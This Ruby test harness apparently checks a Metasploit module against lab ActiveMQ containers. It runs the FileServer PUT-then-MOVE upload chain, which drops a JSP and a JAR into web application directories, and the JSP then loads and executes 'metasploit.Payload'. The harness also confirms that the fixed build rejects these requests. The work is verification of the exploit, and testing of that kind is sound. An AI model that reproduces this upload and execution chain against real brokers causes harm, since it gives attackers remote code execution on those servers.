# frozen_string_literal: true

require_relative 'native_base'

# Exercises real FileServer methods, JSP compilation and uploaded JAR loading.
class ActiveMqFileServerNative < LegacyActiveMqNative
  PROOF = '/tmp/module-target-native-legacy-jar'

  def run
    versions = PROVENANCE.fetch('profiles').fetch('fileserver')
    versions.each { |service, version| identity(service, version) }
    original = app_files
    output = command('affected', 'ps', '-ww', '-eo', 'pid,ppid,user,comm,args')
    processes = output.lines.filter_map do |line|
      fields = line.strip.split(/\s+/, 5)
      next unless fields.length == 5 && fields[2] == 'activemq' && fields[3] == 'java' && fields[4].include?('activemq.jar') && fields[4].include?(' start')

      Integer(fields.first)
    end
    raise 'Native broker JVM missing or ambiguous' unless processes.one?

    pid = processes.first
    environment = command('affected', 'cat', "/proc/#{pid}/environ").split("\0").to_h { |entry| entry.split('=', 2) }
    raise 'Native broker must not inherit JAVA_TOOL_OPTIONS: SDK respawns close child stderr' if environment.key?('JAVA_TOOL_OPTIONS')

    elf = command('affected', 'od', '-An', '-tx1', '-N20', '/lib32/ld-linux.so.2').split.map { |byte| byte.to_i(16) }
    raise 'Native i386 loader identity mismatch' unless elf.length == 20 && elf.first(6) == [127, 69, 76, 70, 1, 1] && elf[18, 2] == [3, 0]
    raise 'Native i386 loader cannot execute' unless command('affected', '/lib32/ld-linux.so.2', '--help').start_with?('Usage: /lib32/ld-linux.so.2')

    proofs = [proof('api', 'admin:admin', pid), proof('admin', 'admin:admin', pid), proof('api', 'user:user', pid)]
    policy = [nil, 'admin:module-target-invalid', 'admin:admin'].map do |credentials|
      path = '/fileserver/module-target-native-policy.txt'
      created = request('affected', 'PUT', path, credentials: credentials, body: 'module-target-native-policy')
      raise 'Native public FileServer policy changed' unless created.fetch(:code) == 204

      removed = request('affected', 'DELETE', path, credentials: credentials)
      raise 'Native FileServer DELETE failed' unless removed.fetch(:code) == 204

      command('affected', 'test', '!', '-e', '/opt/activemq/webapps/fileserver/module-target-native-policy.txt')
      { credentials: credentials, put: created, delete: removed }
    end
    jsp_put_refusals = [nil, 'admin:module-target-invalid'].map do |credentials|
      result = request('affected', 'PUT', '/fileserver/module-target-native-policy.jsp', credentials: credentials, body: 'module-target-native-policy')
      raise 'Native JSP suffix PUT policy mismatch' unless result.fetch(:code) == 401

      command('affected', 'test', '!', '-e', '/opt/activemq/webapps/fileserver/module-target-native-policy.jsp')
      result
    end
    %w[PUT MOVE DELETE].each do |method|
      result = request('fixed', method, '/fileserver/module-target-native-removed.txt', credentials: 'admin:admin',
                                                                                        body: method == 'PUT' ? 'module-target-native-fixed' : nil,
                                                                                        headers: method == 'MOVE' ? { 'Destination' => 'http://127.0.0.1:8161//opt/activemq/webapps/api/module-target-native-removed.txt' } : {})
      raise 'Native removed FileServer policy mismatch' unless result.fetch(:code) == 404
    end
    command('fixed', 'test', '!', '-e', '/opt/activemq/webapps/api/module-target-native-removed.txt')
    raise 'Native app state changed' unless app_files == original

    versions.each { |service, version| identity(service, version) }
    @records[:profiles]['affected'].merge!(proofs: proofs, policy: policy, jsp_put_refusals: jsp_put_refusals, app_files: original, broker_environment: { 'JAVA_TOOL_OPTIONS' => environment['JAVA_TOOL_OPTIONS'], 'ACTIVEMQ_OPTS' => environment['ACTIVEMQ_OPTS'] })
    version = command('unrelated', 'httpd', '-v')
    raise 'Native unrelated version mismatch' unless version.include?('Apache/2.4.62')

    code = command('affected', 'curl', '--silent', '--show-error', '--max-time', '5', '--output', '/dev/null', '--write-out', '%{http_code}', 'http://unrelated/fileserver/module-target-native-missing') # rubocop:disable Style/FormatStringToken
    raise 'Native unrelated FileServer policy mismatch' unless code == '404'

    @records[:profiles]['unrelated'] = { version: version, missing_fileserver: code }
    @records[:http] << { service: 'unrelated', requested_from: 'affected', method: 'GET', path: '/fileserver/module-target-native-missing', code: Integer(code) }
    @records
  ensure
    save_partial('native-fileserver-partial.json')
  end

  private

  def app_files
    command('affected', 'find', '/opt/activemq/webapps/api', '/opt/activemq/webapps/admin', '/opt/activemq/webapps/fileserver', '-maxdepth', '1', '-type', 'f', '-printf', "%p\n").lines.map(&:strip).sort
  end

  def proof(directory, credentials, pid)
    original = app_files
    name = "module-target-native-#{directory}-#{credentials.split(':').first}"
    jar = "/opt/activemq/webapps/#{directory}/#{name}.jar"
    jsp = "/opt/activemq/webapps/#{directory}/#{name}.jsp"
    [jar, jsp, PROOF].each { |path| command('affected', 'test', '!', '-e', path) }
    code = %(<%@ page import="java.io.*" %><%@ page import="java.net.*" %><%
URLClassLoader cl = new java.net.URLClassLoader(new java.net.URL[]{new java.io.File(request.getRealPath("./#{name}.jar")).toURI().toURL()});
Class c = cl.loadClass("metasploit.Payload");
c.getMethod("main",Class.forName("[Ljava.lang.String;")).invoke(null,new java.lang.Object[]{new java.lang.String[0]});
out.print("MODULE_TARGET_NATIVE_JAR=executed"); %>)
    { jar => nil, jsp => code }.each do |target, body|
      path = "/fileserver/#{File.basename(target)}"
      result = request('affected', 'PUT', path, credentials: credentials, body: body, upload: body.nil? ? '/opt/module-target/native-proof.jar' : nil)
      raise 'Native PUT did not succeed' unless result.fetch(:code) == 204

      # This absolute Destination is the real vulnerable FileServer operation.
      destination = directory == 'api' ? target.sub('/api/', '/api//') : target
      result = request('affected', 'MOVE', path, credentials: credentials, headers: { 'Destination' => "http://127.0.0.1:8161/#{destination}" })
      raise 'Native MOVE did not succeed' unless result.fetch(:code) == 204

      command('affected', 'test', '-f', target)
      command('affected', 'test', '!', '-e', "/opt/activemq/webapps/fileserver/#{File.basename(target)}")
    end
    expected = command('affected', 'sha256sum', '/opt/module-target/native-proof.jar').split.first
    raise 'Native moved JAR bytes differ' unless command('affected', 'sha256sum', jar).split.first == expected

    [nil, 'admin:module-target-invalid'].each do |invalid|
      result = request('affected', 'POST', "/#{directory}/#{name}.jsp", credentials: invalid, body: '')
      raise 'Native protected JSP policy mismatch' unless result.fetch(:code) == 401

      command('affected', 'test', '!', '-e', PROOF)
    end
    result = request('affected', 'POST', "/#{directory}/#{name}.jsp", credentials: credentials, body: '')
    raise 'Native JSP did not execute uploaded JAR' unless result.fetch(:code) == 200 && Base64.strict_decode64(result.fetch(:body_base64)).include?('MODULE_TARGET_NATIVE_JAR=executed')

    parent = command('affected', 'cat', PROOF).to_i
    owner = command('affected', 'stat', '-c', '%U', PROOF).strip
    raise 'Native proof owner/JVM parent mismatch' unless parent == pid && owner == 'activemq'

    command('affected', 'rm', jar, jsp, PROOF)
    raise 'Native proof files not restored' unless app_files == original

    { directory: directory, credentials: credentials, jar_sha256: expected, parent_pid: parent, owner: owner }
  end
end

puts JSON.pretty_generate(ActiveMqFileServerNative.new.run) if $PROGRAM_NAME == __FILE__
